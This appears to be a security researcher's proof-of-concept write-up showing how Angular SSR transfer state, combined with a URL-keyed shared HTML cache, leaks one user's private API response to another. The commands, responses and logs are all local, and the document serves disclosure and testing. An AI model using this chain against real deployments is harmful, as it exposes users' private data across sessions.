# A18 shared HTML cache chain

Date: 2026-04-29

## Goal

Test the cross-user confidentiality chain for A18:

1. Angular SSR fetches a private API response using the inbound user cookie.
2. The API response explicitly sends `Vary: Cookie` and `Cache-Control: private, no-store`.
3. Angular `HttpTransferCache` serializes the private API body into SSR HTML / `ng-state`.
4. A shared HTML cache stores the SSR document by URL and does not vary on `Cookie`.
5. A second user receives the first user's private API body from cached HTML.

This is a deployment-dependent chain, not a pure Angular-only exploit. The Angular-specific issue is
that the framework serializes a `private, no-store` API response into the HTML transfer state.

## PoC

File:

```text
bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app/shared_cache_private_state_server.ts
```

The origin app uses:

```text
renderApplication()
provideServerRendering()
provideClientHydration()
provideHttpClient(withFetch(), withInterceptors([cookieForwarder]))
```

The private API endpoint:

```text
GET /api/private
Vary: Cookie
Cache-Control: private, no-store
Body: private:<inbound cookie>
```

The local proxy models a shared cache that keys only by URL.

## Commands

```bash
cd bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app
./node_modules/.bin/tsx shared_cache_private_state_server.ts

curl -sS -i -H 'Cookie: sid=alice' 'http://127.0.0.1:4221/private?case=seq1'
curl -sS -i -H 'Cookie: sid=bob' 'http://127.0.0.1:4221/private?case=seq1'
```

## Alice response

```text
HTTP/1.1 200 OK
X-Proxy-Cache: MISS
```

```html
<div id="private">private:sid=alice</div>
<script id="ng-state" type="application/json">{"3517752801":{"b":"private:sid=alice","h":{},"s":200,"st":"OK","u":"http://127.0.0.1:4220/api/private","rt":"text"},"__nghData__":[{}]}</script>
```

## Bob response

```text
HTTP/1.1 200 OK
X-Proxy-Cache: HIT
```

```html
<div id="private">private:sid=alice</div>
<script id="ng-state" type="application/json">{"3517752801":{"b":"private:sid=alice","h":{},"s":200,"st":"OK","u":"http://127.0.0.1:4220/api/private","rt":"text"},"__nghData__":[{}]}</script>
```

Bob sent `Cookie: sid=bob`, but received Alice's private body in both rendered HTML and `ng-state`.

## Server log

```text
[proxy] MISS /private?case=seq1 cookie= "sid=alice"
[origin] render url: http://127.0.0.1:4220/private?case=seq1 cookie= "sid=alice"
[origin:api] /api/private hit 3 cookie= "sid=alice"
[origin:ssr] private body: private:sid=alice
[proxy] HIT /private?case=seq1 cookie= "sid=bob"
```

The origin was not called for Bob on the cached request.

## Impact interpretation

This demonstrates the high-impact deployment chain:

- private user data from a `Cache-Control: private, no-store` API response is embedded by Angular
  SSR into an HTML document;
- an outer shared cache that stores that HTML by URL can leak the embedded private body cross-user;
- the API's `Vary: Cookie` and `Cache-Control: private, no-store` do not protect the data once
  Angular has copied it into the page.

Severity should be argued as high only when a real deployment caches SSR HTML or otherwise reuses it
cross-user. Without that outer cache/reuse condition, the framework issue remains a medium
cache-semantics and trusted-state poisoning primitive.
